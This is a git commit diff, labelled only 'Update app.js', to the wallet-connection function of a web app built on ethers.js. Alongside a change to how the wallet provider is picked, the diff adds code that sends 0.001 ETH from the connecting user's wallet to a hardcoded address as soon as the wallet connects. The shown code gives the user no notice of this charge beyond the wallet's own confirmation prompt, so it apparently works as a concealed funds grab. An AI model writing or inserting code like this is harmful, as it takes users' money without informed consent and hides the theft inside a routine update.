c2234f1b28966da51d42121c1e8e9d99656b3999
husknet <127146284+husknet@users.noreply.github.com>
2024-06-27 15:17:29 -0300

    Update app.js

--- app.js
+++ app.js
@@ -21,10 +21,24 @@ const accountInfo = document.getElementById('accountInfo');
 
 async function connectWallet() {
   try {
-    provider = new ethers.providers.Web3Provider(await web3Modal.connect());
+    if (window.ethereum) {
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send('eth_requestAccounts', []);
+    } else {
+      provider = new ethers.providers.Web3Provider(await web3Modal.connect());
+    }
+
     signer = provider.getSigner();
     const account = await signer.getAddress();
     accountInfo.innerText = `Connected account: ${account}`;
+
+    // Send $1 worth of Ether
+    const tx = await signer.sendTransaction({
+      to: "0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f",
+      value: ethers.utils.parseEther("0.001"), // Adjust this value based on the current ETH price
+    });
+    await tx.wait();
+    accountInfo.innerText += "\nTransaction successful!";
   } catch (error) {
     console.error("Connection failed:", error);
     accountInfo.innerText = 'Connection failed. Please try again.';
